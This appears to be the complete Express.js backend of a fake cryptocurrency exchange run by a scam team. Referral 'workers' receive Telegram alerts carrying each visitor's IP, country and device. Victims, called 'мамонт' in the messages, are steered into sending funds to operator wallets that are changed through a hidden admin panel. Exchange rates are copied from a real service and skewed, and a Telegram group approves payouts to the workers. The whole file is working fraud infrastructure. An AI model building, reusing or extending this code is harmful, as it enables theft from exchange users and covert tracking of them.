const express = require("express");
const http = require("http");

const bodyParser = require("body-parser");
const session = require("express-session");
const cookieParser = require('cookie-parser')
const paginate = require('express-paginate');

const path = require("path");
const axios = require("axios");
const { v4: uuidv4 } = require('uuid');

const geoIp = require("geoip-lite");
const { getName } = require("country-list");
const userAgent = require("express-useragent");

const { Setting, Claim, Worker, Wallet, AuthCode, Course } = require("../models");
const { sendMessage } = require("../utils/telegram");
const { converter } = require("../utils/converter");

const app = express();

const subdomain = require('express-subdomain');

app.set("trust proxy", 1);
app.use(
    session({
        secret: "porfa este dos puntos",
        resave: false,
        saveUninitialized: true,
    })
);
app.use(cookieParser());
app.use(
    bodyParser.urlencoded({
        extended: true,
    })
);
app.use(paginate.middleware(10, 50));

const coins = JSON.parse('{"2":"Сбербанк RUB","4":"Ethereum (ERC20)","5":"Bitcoin","6":"Ethereum Classic","7":"Litecoin","8":"Qiwi RUB","13":"Payeer RUB","14":"Payeer USD","15":"Альфа банк  RUB","16":"ВТБ","17":"Visa/MC RUB","18":"Тинькофф","19":"AdvCash RUB","20":"AdvCash USD","21":"Bitcoin Gold","22":"NEM","23":"Tezos","26":"Dash","27":"Dogecoin","28":"Monero","29":"Tron","30":"XRP","31":"Zcash","32":"Русский стандарт","33":"Газпромбанк","34":"Кукуруза","35":"РНКБ","37":"РосБанк","38":"Lisk","40":"USDCoin BEP20 (USDC)","41":"ICON","42":"BAT","43":"Qtum","44":"Cosmos","46":"Payeer EUR","48":"Юmoney (Я.деньги)","49":"ПУМБ","50":"Ощадбанк","51":"УкрСиббанк","52":"Монобанк","53":"Privat 24 UAH","54":"Visa/MC UAH","55":"Tether USDT (TRC20)","57":"Tether USDT (ERC20)","58":"Binance Coin (BEP20)","59":"Bitcoin Cash","60":"Stellar","62":"Сбербанк UAH","63":"Альфа банк UAH","65":"ADVCash EUR","66":"ADVCash UAH","67":"Cardano","68":"EOS","69":"Uniswap","70":"Bitcoin SV","73":"Россельхозбанк","74":"Solana","75":"Polkadot","76":"Wrapped Bitcoin","77":"Polygon","82":"0x (ERC20)","83":"VeChain","84":"Ravencoin","85":"Ethereum (BEP20)","87":"Bitcoin (BEP20)","88":"Райффайзенбанк","89":"Открытие","90":"Промсвязьбанк","93":"Хоум Кредит","94":"Почта банк","95":"МТС Банк","96":"Авангард","97":"Мобильная связь РФ","98":"Pancakeswap (BSC)","99":"Chainlink","100":"Algorand","101":"Waves","102":"Ontology","104":"Filecoin","105":"Binance USD (BEP2)","106":"Binance USD (BEP20)","107":"TON Coin","110":"Tether USDT (BEP20)","111":"NEAR Protocol","113":"DAI (BEP20)","114":"Avalanche (AVAX)","115":"True USD (BEP20)","117":"HalykBank KZT","118":"Сбербанк KZT","119":"ForteBank KZT","120":"Kaspi Bank KZT","121":"Jusan Bank KZT","122":"Visa/MasterCard KZT","125":"Tether USDT (SOL)","126":"Binance Coin (BEP2)","127":"MasterCard EUR","128":"Любой банк EUR","129":"USDCoin ERC20 (USDC)","130":"USDCoin SOL (USDC)","131":"USDCoin TRC20 (USDC)","132":"Matic BEP20 (BSC)","134":"Карта UZCARD UZS","135":"Карта HUMO UZS","160":"Visa/MasterCard AZN"}');

app.use(express.static(path.join(__dirname, "/public")));
app.set("views", path.join(__dirname, "views"));
app.engine("html", require("ejs").renderFile);
app.set("view engine", "html");

app.use((req, res, next) => {
    if (!req.app.get('view engine')) throw new Error('View engine not set');
    res.flash = function (view, options, variables) {
        let flash = {};
        if (options.type) { flash.type = options.type } else { throw new Error('Please specify a flash type'); }
        if (options.message) { flash.message = options.message } else { throw new Error('Please specify a flash message'); }
        if (options.title) flash.title = options.title;
        if (options.class) flash.class = options.class;
        if (options.id) flash.id = options.id;
        let responseVariables = {};
        responseVariables.flash = flash;
        Object.keys(variables).forEach(function (key) {
            responseVariables[key] = variables[key];
        });
        res.render(view, responseVariables);
    };
    next();
})

app.use((req, res, next) => {
    var ip = String(req.headers["cf-connecting-ip"] || req.headers["x-forwarded-for"] || req.connection.remoteAddress).replace("::ffff:", "");
    req.realIp = ip;
    req.fullUrl = req.protocol + "://" + req.get("host") + req.originalUrl;
    return next();
});

function getRandomArbitrary(min, max) {
    return Math.random() * (max - min) + min;
}

function getUserInfo(req) {
    try {
        var text = `🛡 IP: <b>${req.realIp}</b>`;
        const ipInfo = geoIp.lookup(req.realIp),
            userInfo = userAgent.parse(req.headers["user-agent"]);
        try {
            text += `\n🌎 Страна: <b>${getName(ipInfo.country)}</b>`;
        } catch (err) { }
        text += `\n— Устройство: <b>${userInfo.isMobile
            ? "📱 Телефон"
            : userInfo.isDesktop
                ? "🖥 Компьютер"
                : userInfo.isBot
                    ? "🤖 Бот"
                    : "📟 Что-то другое"
            }</b>`;

        return text;
    } catch (err) {
        return "🔍 Нет данных";
    }
}

var routerRu = express.Router();
var routerEn = express.Router();

routerRu.get("/", async (req, res) => {
    if (req.query.ref) {
        const { ref } = req.query;

        const worker = await Worker.findOne({
            where: {
                ref_code: ref
            }
        })

        if (worker) {
            let message = [
                "<b>🔎 Переход по ссылке</b>",
                "",
                getUserInfo(req)
            ];

            await sendMessage(worker.telegram_id, message.join("\r\n"))
            res.cookie('ref_id', ref, { maxAge: 48 * 60 * 60 * 1000, httpOnly: true });
        }
    } else {
        if (req.cookies.ref_id) {
            const { ref_id } = req.cookies;

            const worker = await Worker.findOne({
                where: {
                    ref_code: ref_id
                }
            })

            if (worker) {
                let message = [
                    "<b>🔎 Переход по ссылке</b>",
                    "",
                    getUserInfo(req)
                ];

                await sendMessage(worker.telegram_id, message.join("\r\n"))
            }
        }
    }


    return res.render("index", {
        id: getRandomArbitrary(0, 1000)
    });
})

routerRu.get("/claim/:id", async (req, res) => {
    try {
        const claim = await Claim.findOne({
            where: {
                uuid: req.params.id
            }
        })

        if (!claim || claim.status === "closed") {
            res.status(404)
        }


        if (req.cookies.ref_id) {
            const { ref_id } = req.cookies;

            const worker = await Worker.findOne({
                where: {
                    ref_code: ref_id
                }
            })

            if (worker) {
                let message = [
                    `🎗Начало обмена ${JSON.parse(claim.from).name_ru} ➡️ ${JSON.parse(claim.to).name_ru}`,
                    "",
                    "<b>📎Мамонт начал обмен, ожидаем перевод на кошелек</b>"
                ];

                await sendMessage(worker.telegram_id, message.join("\r\n"))
            }
        }

        const wallet = await Wallet.findOne({
            where: {
                coin_id: JSON.parse(claim.from).id
            }
        })

        if (!wallet) {
            return res.send({
                error: "Не удалось получить кошелек",
                error_code: "wallet_404"
            })
        }

        res.render("claim", {
            claim: claim,
            wallet: wallet
        })
    } catch (err) {
        console.log(err)
    }
})

routerRu.get("/claim/:id/success", async (req, res) => {
    const claim = await Claim.findOne({
        where: {
            uuid: req.params.id
        }
    })

    if (!claim) {
        return res.status(404).send("Not found")
    }

    res.render("success", {
        claim: claim
    })
})

routerRu.get("/claim/:id/status", async (req, res) => {
    const claim = await Claim.findOne({
        where: {
            uuid: req.params.id
        }
    })

    if (!claim) {
        return res.status(404).send("Not found")
    }

    res.json({
        status: claim.status
    })
})

routerRu.get("/api", async (req, res) => {
    const endpoint = req.query.endpoint;

    if (endpoint == "tech") {
        const tech = await Setting.findOne({
            where: {
                key: "tech",
            }
        })

        let js = JSON.parse(tech.value);

        js.time -= 1;
        tech.value = JSON.stringify(js);
        await tech.save();

        return res.send(js)

        // return res.send({
        //     techOn: false,
        //     time: -1
        // })
    }

    const response = await axios.get(`https://coinstart.cc/${endpoint}`, {
        headers: {
            "Accept-Encoding": "*",
        }
    });


    if (endpoint.includes("pair")) {
        const onePair = (endpoint.split("pair/")[1]).split("/")[0];
        
        const course = await Course.findOne({
            where: {
                coin_id: onePair
            }
        })

        if(course) {
            let oldCourse = response.data.course;

            let percent = (oldCourse / 100) * 1;

            let value = percent * course.value;

            if(course.type == "plus") {
                response.data.course = oldCourse + value
            } else if(course.type == "minus") {
                response.data.course = oldCourse - value
            }

            return res.send(response.data)
        }
    }

    return res.send(response.data)
})

routerRu.post("/claim", async (req, res) => {
    const claim = await Claim.create({
        ref_code: req.cookies.ref_id,
        to: req.body.to,
        from: req.body.from,
        amounts: JSON.stringify({
            from: req.body.from_pay,
            to: req.body.to_pay
        }),
        uuid: uuidv4(),
        userRequisites: JSON.stringify({
            from: {},
            to: {
                wallet: req.body.to_requis1
            }
        }),
        status: "open"
    })

    const response = {
        response: "success",
        toLogo: JSON.parse(claim.to).logoWithBackground,
        fromLogo: JSON.parse(claim.from).logoWithBackground,
        claim: {
            claimUuid: claim.uuid,
            isAutomatic: false,
            claimId: claim.id,
            userRequisites: JSON.parse(claim.userRequisites),
            amounts: JSON.parse(claim.amounts)
        },
    }

    return res.send(response)
})

routerRu.post("/claim/:id/confirm", async (req, res) => {
    const claim = await Claim.findOne({
        where: {
            uuid: req.params.id
        }
    })

    if (!claim) {
        return res.status(404).send("Not found")
    }

    if (claim.status == "process") {
        return res.redirect("/")
    }

    claim.status = "process"
    await claim.save()

    const from = JSON.parse(claim.from)
    const amounts = JSON.parse(claim.amounts)

    const wallet = await Wallet.findOne({
        where: {
            coin_id: JSON.parse(claim.from).id
        }
    })

    if (req.cookies.ref_id) {
        const { ref_id } = req.cookies;

        const worker = await Worker.findOne({
            where: {
                ref_code: ref_id
            }
        })

        if (worker) {
            const convertedAmount = await converter(amounts.from, from.id)

            let message = [
                `✅ Обнаружен перевод`,
                "",
                `💸 Сумма: ${amounts.from} ${String(from.currency).toUpperCase()} / ${convertedAmount} USD`,
                `🔗 Кошелек (${String(from.currency).toUpperCase()}): <code>${wallet.value}</code>`,
                "",
                `👤 Воркер: @${worker.username}`,
            ];

            await sendMessage("-1001831734906", message.join("\r\n"), {
                inline_keyboard: [
                    [
                        {
                            text: '✅ Выплатить',
                            callback_data: `payment#${claim.id}`,
                        },
                    ],
                ],
            })
        }
    }

    res.redirect(`/claim/${req.params.id}/success`)
})

routerRu.get("/contacts", async (req, res) => res.render("contacts"))
routerRu.get("/faq", async (req, res) => res.render("faq"))
routerRu.get("/partners", async (req, res) => res.render("partners"))
routerRu.get("/rules", async (req, res) => res.render("rules"))

routerEn.get("/", async (req, res) => {
    if (req.query.ref) {
        const { ref } = req.query;

        const worker = await Worker.findOne({
            where: {
                ref_code: ref
            }
        })

        if (worker) {
            let message = [
                "<b>🔎 Переход по ссылке</b>",
                "",
                getUserInfo(req)
            ];

            await sendMessage(worker.telegram_id, message.join("\r\n"))
            res.cookie('ref_id', ref, { maxAge: 48 * 60 * 60 * 1000, httpOnly: true });
        }
    } else {
        if (req.cookies.ref_id) {
            const { ref_id } = req.cookies;

            const worker = await Worker.findOne({
                where: {
                    ref_code: ref_id
                }
            })

            if (worker) {
                let message = [
                    "<b>🔎 Переход по ссылке</b>",
                    "",
                    getUserInfo(req)
                ];

                await sendMessage(worker.telegram_id, message.join("\r\n"))
            }
        }
    }


    return res.render("en/index", {
        id: getRandomArbitrary(0, 1000)
    });
})

routerEn.get("/claim/:id", async (req, res) => {
    try {
        const claim = await Claim.findOne({
            where: {
                uuid: req.params.id
            }
        })

        if (!claim || claim.status === "closed") {
            res.status(404)
        }


        if (req.cookies.ref_id) {
            const { ref_id } = req.cookies;

            const worker = await Worker.findOne({
                where: {
                    ref_code: ref_id
                }
            })

            if (worker) {
                let message = [
                    `🎗Начало обмена ${JSON.parse(claim.from).name_ru} ➡️ ${JSON.parse(claim.to).name_ru}`,
                    "",
                    "<b>📎Мамонт начал обмен, ожидаем перевод на кошелек</b>"
                ];

                await sendMessage(worker.telegram_id, message.join("\r\n"))
            }
        }

        const wallet = await Wallet.findOne({
            where: {
                coin_id: JSON.parse(claim.from).id
            }
        })

        if (!wallet) {
            return res.send({
                error: "Не удалось получить кошелек",
                error_code: "wallet_404"
            })
        }

        res.render("en/claim", {
            claim: claim,
            wallet: wallet
        })
    } catch (err) {
        console.log(err)
    }
})

routerEn.get("/claim/:id/success", async (req, res) => {
    const claim = await Claim.findOne({
        where: {
            uuid: req.params.id
        }
    })

    if (!claim) {
        return res.status(404).send("Not found")
    }

    res.render("en/success", {
        claim: claim
    })
})

routerEn.get("/claim/:id/status", async (req, res) => {
    const claim = await Claim.findOne({
        where: {
            uuid: req.params.id
        }
    })

    if (!claim) {
        return res.status(404).send("Not found")
    }

    res.json({
        status: claim.status
    })
})

routerEn.get("/api", async (req, res) => {
    const endpoint = req.query.endpoint;

    if (endpoint == "tech") {
        const tech = await Setting.findOne({
            where: {
                key: "tech",
            }
        })

        let js = JSON.parse(tech.value);

        js.time -= 1;
        tech.value = JSON.stringify(js);
        await tech.save();

        return res.send(js)

        // return res.send({
        //     techOn: false,
        //     time: -1
        // })
    }

    const response = await axios.get(`https://coinstart.cc/${endpoint}`, {
        headers: {
            "Accept-Encoding": "*",
        }
    });


    if (endpoint.includes("pair")) {
        const onePair = (endpoint.split("pair/")[1]).split("/")[0];
        
        const course = await Course.findOne({
            where: {
                coin_id: onePair
            }
        })

        if(course) {
            let oldCourse = response.data.course;

            let percent = (oldCourse / 100) * 1;

            let value = percent * course.value;

            if(course.type == "plus") {
                response.data.course = oldCourse + value
            } else if(course.type == "minus") {
                response.data.course = oldCourse - value
            }

            return res.send(response.data)
        }
    }

    return res.send(response.data)
})

routerEn.post("/claim", async (req, res) => {
    const claim = await Claim.create({
        ref_code: req.cookies.ref_id,
        to: req.body.to,
        from: req.body.from,
        amounts: JSON.stringify({
            from: req.body.from_pay,
            to: req.body.to_pay
        }),
        uuid: uuidv4(),
        userRequisites: JSON.stringify({
            from: {},
            to: {
                wallet: req.body.to_requis1
            }
        }),
        status: "open"
    })

    const response = {
        response: "success",
        toLogo: JSON.parse(claim.to).logoWithBackground,
        fromLogo: JSON.parse(claim.from).logoWithBackground,
        claim: {
            claimUuid: claim.uuid,
            isAutomatic: false,
            claimId: claim.id,
            userRequisites: JSON.parse(claim.userRequisites),
            amounts: JSON.parse(claim.amounts)
        },
    }

    return res.send(response)
})

routerEn.post("/claim/:id/confirm", async (req, res) => {
    const claim = await Claim.findOne({
        where: {
            uuid: req.params.id
        }
    })

    if (!claim) {
        return res.status(404).send("Not found")
    }

    if (claim.status == "process") {
        return res.redirect("/")
    }

    claim.status = "process"
    await claim.save()

    const from = JSON.parse(claim.from)
    const amounts = JSON.parse(claim.amounts)

    const wallet = await Wallet.findOne({
        where: {
            coin_id: JSON.parse(claim.from).id
        }
    })

    if (req.cookies.ref_id) {
        const { ref_id } = req.cookies;

        const worker = await Worker.findOne({
            where: {
                ref_code: ref_id
            }
        })

        if (worker) {
            const convertedAmount = await converter(amounts.from, from.id)

            let message = [
                `✅ Обнаружен перевод`,
                "",
                `💸 Сумма: ${amounts.from} ${String(from.currency).toUpperCase()} / ${convertedAmount} USD`,
                `🔗 Кошелек (${String(from.currency).toUpperCase()}): <code>${wallet.value}</code>`,
                "",
                `👤 Воркер: @${worker.username}`,
            ];

            await sendMessage("-1001831734906", message.join("\r\n"), {
                inline_keyboard: [
                    [
                        {
                            text: '✅ Выплатить',
                            callback_data: `payment#${claim.id}`,
                        },
                    ],
                ],
            })
        }
    }

    res.redirect(`/claim/${req.params.id}/success`)
})

routerEn.get("/contacts", async (req, res) => res.render("en/contacts"))
routerEn.get("/faq", async (req, res) => res.render("en/faq"))
routerEn.get("/partners", async (req, res) => res.render("en/partners"))
routerEn.get("/rules", async (req, res) => res.render("en/rules"))

app.get("/admin", async (req, res) => {
    let acode = "";
    if (req.query.code) {
        acode = req.query.code
    }
    if (!req.query.code) {
        if (req.cookies.auth_code) {
            acode = req.cookies.auth_code
        } else {
            return res.status(404).send("Page not found")
        }
    }


    const authCode = await AuthCode.findOne({
        where: {
            code: acode
        }
    })

    if (!authCode) {
        return res.status(404).send("Page not found")
    }

    res.cookie('auth_code', authCode.code, { maxAge: 1 * 60 * 60 * 1000, httpOnly: true });

    return res.redirect("/admin/wallets")
})

app.get("/admin/wallets", async (req, res) => {
    let acode = "";
    if (req.query.code) {
        acode = req.query.code
    }
    if (!req.query.code) {
        if (req.cookies.auth_code) {
            acode = req.cookies.auth_code
        } else {
            return res.status(404).send("Page not found")
        }
    }


    const authCode = await AuthCode.findOne({
        where: {
            code: acode
        }
    })

    if (!authCode) {
        return res.status(404).send("Page not found")
    }

    res.cookie('auth_code', authCode.code, { maxAge: 1 * 60 * 60 * 1000, httpOnly: true });

    const wallets = await Wallet.findAll();

    const messages = req?.session?.flash;

    req.session.flash = null;

    return res.render("admin/wallets", {
        coins: coins,
        wallets,
        flash: messages
    })
})

app.post("/admin/wallets", async (req, res) => {
    if (!req.cookies.auth_code) {
        return res.status(404).send("Page not found")
    }

    const authCode = await AuthCode.findOne({
        where: {
            code: req.cookies.auth_code
        }
    })

    if (!authCode) {
        return res.status(404).send("Page not found")
    }

    let flash;

    if (!req.body.wallet_value) {
        req.session.flash = {
            type: 'error',
            message: 'Вы не ввели новый кошелек'
        }
        return res.redirect('/admin/wallets');
    }

    if (!req.body.id) {
        req.session.flash = {
            type: 'error',
            message: 'Неизвестная ошибка #444'
        }
        return res.redirect('/admin/wallets');
    }


    const wallet = await Wallet.findOne({
        where: {
            id: req.body.id
        }
    })

    if (!wallet) {
        req.session.flash = {
            type: 'error',
            message: `Кошелек с ID ${req.body.id} не был найден`
        };
        return res.redirect('/admin/wallets');
    }

    wallet.value = req.body.wallet_value
    await wallet.save();

    req.session.flash = {
        type: 'success',
        message: `Кошелек успешно изменен`
    };
    return res.redirect('/admin/wallets');
})

app.get("/admin/course", async (req, res, next) => {
    let acode = "";
    if (req.query.code) {
        acode = req.query.code
    }
    if (!req.query.code) {
        if (req.cookies.auth_code) {
            acode = req.cookies.auth_code
        } else {
            return res.status(404).send("Page not found")
        }
    }


    const authCode = await AuthCode.findOne({
        where: {
            code: acode
        }
    })

    if (!authCode) {
        return res.status(404).send("Page not found")
    }

    res.cookie('auth_code', authCode.code, { maxAge: 1 * 60 * 60 * 1000, httpOnly: true });

    const courses = await Course.findAll();

    const messages = req?.session?.flash;

    req.session.flash = null;

    return res.render("admin/course", {
        coins: coins,
        courses,
        flash: messages
    })
})

app.post("/admin/course", async (req, res) => {
    if (!req.cookies.auth_code) {
        return res.status(404).send("Page not found")
    }

    const authCode = await AuthCode.findOne({
        where: {
            code: req.cookies.auth_code
        }
    })

    if (!authCode) {
        return res.status(404).send("Page not found")
    }

    let flash;

    if (!req.body.course_value) {
        req.session.flash = {
            type: 'error',
            message: 'Вы не ввели новое значение'
        }
        return res.redirect('/admin/course');
    }

    if (!req.body.id) {
        req.session.flash = {
            type: 'error',
            message: 'Неизвестная ошибка #555'
        }
        return res.redirect('/admin/course');
    }


    const course = await Course.findOne({
        where: {
            id: req.body.id
        }
    })

    if (!course) {
        req.session.flash = {
            type: 'error',
            message: `Курс с ID ${req.body.id} не был найден`
        };
        return res.redirect('/admin/course');
    }

    course.type = req.body.type
    course.value = req.body.course_value
    await course.save();

    req.session.flash = {
        type: 'success',
        message: `Курс успешно изменен`
    };
    return res.redirect('/admin/course');
})

app.get("/admin/logout", async (req, res) => {
    if (!req.cookies.auth_code) {
        return res.status(404).send("Page not found")
    }

    const authCode = await AuthCode.findOne({
        where: {
            code: req.cookies.auth_code
        }
    })

    if (!authCode) {
        return res.status(404).send("Page not found")
    }

    res.clearCookie('auth_code');

    authCode.destroy();

    return res.status(404).send("Вы успешно вышли из админ панели")
})

app.use(subdomain('ru', routerRu));
app.use(subdomain('en', routerEn));
const server = http.createServer(app);
server.listen(8443, () => console.log("Server started"));